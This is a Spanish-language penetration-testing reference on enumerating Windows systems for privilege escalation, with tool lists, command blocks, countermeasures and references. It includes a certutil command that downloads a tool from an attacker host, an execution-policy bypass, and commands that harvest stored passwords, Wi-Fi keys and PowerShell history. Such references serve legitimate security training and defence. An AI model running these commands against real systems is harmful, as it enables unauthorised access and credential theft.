# Enumeración para Escalada de Privilegios en Windows

## Descripción
La enumeración para escalada de privilegios en Windows es el proceso de recolección sistemática de información de un sistema comprometido para identificar vectores que permitan elevar privilegios. Incluye la inspección de permisos de servicios, tareas programadas, parches faltantes, privilegios del token del usuario actual, configuraciones de registro, archivos con credenciales almacenadas, software instalado vulnerable y configuraciones de autorun. Herramientas automatizadas como winPEAS, Sherlock y PowerUp consolidan cientos de verificaciones en una sola ejecución, identificando rápidamente las rutas más probables hacia SYSTEM o administrador.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1082 (System Information Discovery); T1083 (File and Directory Discovery)
- **Plataforma**: Windows
- **Dificultad**: Básica

## Herramientas
- **winPEAS** (`winpeas.exe`, `winpeas.bat`) — enumeración integral con colores por severidad, la herramienta más completa para privesc Windows
- **PowerUp.ps1** (PowerSploit) — enumeración enfocada en misconfiguraciones de servicios y autorun
- **Sherlock.ps1** / **Watson** — identificación de parches faltantes y CVEs explotables
- **Seatbelt** (GhostPack, `Seatbelt.exe`) — recolección de información de seguridad del host
- **accesschk.exe** (Sysinternals) — verificación de permisos sobre objetos del sistema

## Comandos / Ejemplos

### Ejecución de winPEAS
```powershell
# Transferir winPEAS al objetivo
certutil.exe -urlcache -f http://10.10.14.5:8080/winpeas.exe winpeas.exe

# Ejecutar con todas las verificaciones
.\winpeas.exe

# Ejecutar en modo silencioso (sin banner)
.\winpeas.exe quiet

# Ejecutar solo módulos específicos
.\winpeas.exe servicesinfo
.\winpeas.exe userinfo

# Versión en batch (no requiere .NET)
.\winpeas.bat

# Colores de severidad:
# ROJO = Vector de privesc altamente probable
# AMARILLO = Configuración potencialmente vulnerable
# VERDE = Información relevante
```

### Enumeración manual — información del sistema
```powershell
# Información del sistema operativo y parches
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Parches instalados (para buscar faltantes)
wmic qfe list brief
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Usuarios y grupos
whoami
whoami /priv
whoami /groups
net user
net localgroup Administrators

# Verificar privilegios peligrosos
whoami /priv
# Buscar: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege,
#          SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege,
#          SeTakeOwnershipPrivilege, SeLoadDriverPrivilege
```

### Enumeración manual — servicios y tareas
```powershell
# Servicios en ejecución
sc queryex type= service state= all
wmic service get name,startname,pathname

# Buscar rutas de servicio sin comillas (Unquoted Service Paths)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Tareas programadas
schtasks /query /fo LIST /v

# Programas de autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Software instalado
wmic product get name,version
```

### Enumeración manual — credenciales y archivos sensibles
```powershell
# Buscar archivos con contraseñas
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

# Credenciales guardadas
cmdkey /list

# Archivos de configuración IIS
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul

# SAM y SYSTEM (si accesibles)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Contraseñas de WiFi guardadas
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

# Historial de PowerShell
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Enumeración manual — red y conexiones
```powershell
# Conexiones activas y puertos
netstat -ano
netstat -ano | findstr LISTENING

# Configuración de red
ipconfig /all
route print
arp -a

# Shares de red
net share
```

### PowerUp — enumeración automatizada
```powershell
# Importar y ejecutar todas las verificaciones
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Verificaciones específicas
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
```

## Contramedidas
- Restringir ejecución de scripts PowerShell con políticas de Constrained Language Mode
- Habilitar AMSI (Antimalware Scan Interface) para detectar herramientas de enumeración conocidas
- Configurar AppLocker o WDAC para bloquear ejecución de binarios no autorizados
- Monitorear ejecución de herramientas de enumeración con reglas EDR/Sysmon
- Aplicar parches de seguridad regularmente para reducir la superficie de ataque
- Implementar el principio de mínimo privilegio en permisos de servicios, tareas y directorios
- Limpiar credenciales almacenadas y deshabilitar almacenamiento de contraseñas en caché cuando sea posible

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1082: System Information Discovery. https://attack.mitre.org/techniques/T1082/
- MITRE Corporation. (2024). ATT&CK Technique T1083: File and Directory Discovery. https://attack.mitre.org/techniques/T1083/
- carlospolop. (s.f.). *PEASS-ng* [Software]. GitHub. https://github.com/peass-ng/PEASS-ng
- PowerShellMafia. (s.f.). *PowerSploit* [Software]. GitHub. https://github.com/PowerShellMafia/PowerSploit
- GhostPack. (s.f.). *Seatbelt* [Software]. GitHub. https://github.com/GhostPack/Seatbelt
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
